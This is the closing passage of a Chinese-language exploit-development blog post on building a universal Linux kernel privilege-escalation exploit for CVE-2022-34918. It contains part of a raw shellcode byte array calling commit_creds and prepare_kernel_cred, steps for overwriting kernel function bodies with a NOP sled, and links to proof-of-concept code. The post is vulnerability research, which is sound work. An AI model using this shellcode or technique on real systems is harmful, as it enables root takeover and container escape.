class="number">0xc8</span>, <span class="number">0x74</span>, <span class="number">0x2f</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x31</span>, <span class="number">0xdb</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xcf</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xcf</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x1f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x2f</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xfd</span>, <span class="number">0x41</span>, <span class="number">0x0f</span>, <span class="number">0x44</span>, <span class="number">0xd4</span>, <span class="number">0x4c</span>,</span><br><span class="line">  <span class="number">0x39</span>, <span class="number">0xd5</span>, <span class="number">0x41</span>, <span class="number">0x0f</span>, <span class="number">0x44</span>, <span class="number">0xdc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc7</span>, <span class="number">0x08</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>,</span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0xe2</span>, <span class="number">0x85</span>, <span class="number">0xd2</span>, <span class="number">0x74</span>, <span class="number">0xde</span>, <span class="number">0xeb</span>, <span class="number">0x06</span>, <span class="number">0x49</span>, <span class="number">0x83</span>, <span class="number">0xc3</span>, <span class="number">0x08</span>,</span><br><span class="line">  <span class="number">0xeb</span>, <span class="number">0xb9</span>, <span class="number">0x4d</span>, <span class="number">0x85</span>, <span class="number">0xc9</span>, <span class="number">0x74</span>, <span class="number">0x0a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0x29</span>,</span><br><span class="line">  <span class="number">0xc1</span>, <span class="number">0x4d</span>, <span class="number">0x89</span>, <span class="number">0x0c</span>, <span class="number">0x0e</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x5b</span>, <span class="number">0x41</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x5e</span>,</span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x5f</span>, <span class="number">0x5d</span>, <span class="number">0xc3</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd0</span>, <span class="number">0x49</span>, <span class="number">0xf7</span>, <span class="number">0xd8</span>, <span class="number">0x41</span>,</span><br><span class="line">  <span class="number">0xb9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xfb</span>, <span class="number">0x4e</span>, <span class="number">0x8d</span>,</span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x07</span>, <span class="number">0x4d</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x4d</span>, <span class="number">0x39</span>, <span class="number">0xd3</span>, <span class="number">0x77</span>, <span class="number">0x50</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xca</span>, <span class="number">0x74</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x8a</span>, <span class="number">0x1c</span>, <span class="number">0x0b</span>, <span class="number">0x3a</span>, <span class="number">0x1c</span>, <span class="number">0x0e</span>,</span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0xeb</span>, <span class="number">0xed</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xc3</span>, <span class="number">0xeb</span>, <span class="number">0xe1</span>,</span><br><span class="line">  <span class="number">0x4d</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xf9</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe7</span>, <span class="number">0xfc</span>,</span><br><span class="line">  <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xcf</span>, <span class="number">0x73</span>, <span class="number">0x13</span>, <span class="number">0x8b</span>, <span class="number">0x0f</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xdb</span>, <span class="number">0x48</span>, <span class="number">0x29</span>,</span><br><span class="line">  <span class="number">0xcb</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xfb</span>, <span class="number">0x74</span>, <span class="number">0x11</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc7</span>, <span class="number">0x04</span>, <span class="number">0xeb</span>, <span class="number">0xe8</span>,</span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x4d</span>, <span class="number">0x29</span>, <span class="number">0xd9</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xdf</span>, <span class="number">0xeb</span>, <span class="number">0xab</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xc7</span>, <span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf8</span>, <span class="number">0x5b</span>, <span class="number">0xc3</span>, <span class="number">0x63</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x6d</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x5f</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x65</span>,</span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x5f</span>, <span class="number">0x6b</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6e</span>, <span class="number">0x65</span>, <span class="number">0x6c</span>, <span class="number">0x5f</span>,</span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x70</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6b</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x5f</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x6e</span>, <span class="number">0x73</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x5f</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x5f</span>, <span class="number">0x6e</span>, <span class="number">0x73</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>我先是把上面这段shellcode覆盖 fs_context 的 parse_param 函数，即可不依赖cred泄露完成提权和逃逸：</p>
<p><img src="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813152514021.png"></p>
<p>poc链接：<a target="_blank" rel="noopener" href="https://github.com/veritas501/CVE-2022-34918/tree/master/poc_fs_context_common">https://github.com/veritas501/CVE-2022-34918/tree/master/poc_fs_context_common</a></p>
<p>但当我将上面这段shellcode用于覆盖 user_key_payload 的 user_free_payload_rcu 函数时内核发生了崩溃。通过调试发现，是因为shellcode的宿主 user_free_payload_rcu 函数体积太小，不够存放完整的shellcode，因此shellcode覆盖到了后面的函数，而后面的函数会先于 user_free_payload_rcu 调用，因此执行到了非法指令。解决方法是在shellcode前面放入一定长度nop雪橇（nop sled），从而能够在执行到后面的函数时直接“滑”到我们的shellcode上。</p>
<p><img src="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813152121943.png"></p>
<p>poc链接：<a target="_blank" rel="noopener" href="https://github.com/veritas501/CVE-2022-34918/tree/master/poc_keyring_common">https://github.com/veritas501/CVE-2022-34918/tree/master/poc_keyring_common</a></p>
<p>PS. 其实提权的shellcode不止这一种，例如也可以通过调用导出函数<code>call_usermodehelper</code>来提权，由于这种方法比较简单，这里留给读者来尝试与思考。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * call_usermodehelper() - prepare and start a usermode application</span></span><br><span class="line"><span class="comment"> * @path: path to usermode executable</span></span><br><span class="line"><span class="comment"> * @argv: arg vector for process</span></span><br><span class="line"><span class="comment"> * @envp: environment for process</span></span><br><span class="line"><span class="comment"> * @wait: wait for the application to finish and return status.</span></span><br><span class="line"><span class="comment"> *        when UMH_NO_WAIT don&#x27;t wait at all, but you get no useful error back</span></span><br><span class="line"><span class="comment"> *        when the program couldn&#x27;t be exec&#x27;ed. This makes it safe to call</span></span><br><span class="line"><span class="comment"> *        from interrupt context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function is the equivalent to use call_usermodehelper_setup() and</span></span><br><span class="line"><span class="comment"> * call_usermodehelper_exec().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">call_usermodehelper</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> **argv, <span class="type">char</span> **envp, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="type">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line">					 <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(call_usermodehelper);</span><br></pre></td></tr></table></figure>



<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03. 总结"></a>0x03. 总结</h2><p>随着越来越多的软硬件缓释措施不断部署，我们可以发现传统的ROP，JOP利用技术越来越难以攻破现有系统。当几年前的我听到shadow stack，control-flow guard等防御时，我曾一度以为未来漏洞利用将变成一件几乎不可能的事情。</p>
<p>但恰恰相反的是，我幸运地见证了越来越多新型攻击技术的诞生。例如数年前对eBPF的攻击去构造内核任意地址读写，亦或是去年 Google 的 Jin Xingyu 学长提出的 ret2bpf技术，又如今年360在BlackHat Asia上提出的USMA技巧，由DirtyPipe启发而来的Pipe原语，美国西北大学即将公开的DirtyCred技术等等。这些新型攻击技术无不为我展示了漏洞利用无穷的可能性，也让我感觉到漏洞利用中的那种艺术的美感。</p>
<p>最后还是那句话，纸上得来终觉浅，绝知此事要躬行。</p>
<p><img src="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813161913120.png"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E7%AE%80%E5%8D%95%E5%9B%9E%E9%A1%BE%E4%B8%8A%E6%AC%A1%E7%9A%84%E6%89%8B%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">0x00. 简单回顾上次的手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%96%B0%E6%9C%8B%E5%8F%8B-fs-context"><span class="toc-number">2.</span> <span class="toc-text">0x01. 新朋友 fs_context</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-ksymtab-make-shellcode-great-again"><span class="toc-number">3.</span> <span class="toc-text">0x02. ksymtab make shellcode great again</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03. 总结</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&text=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&is_video=false&description=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践&body=Check out this article: https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&name=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&t=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    veritas501
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
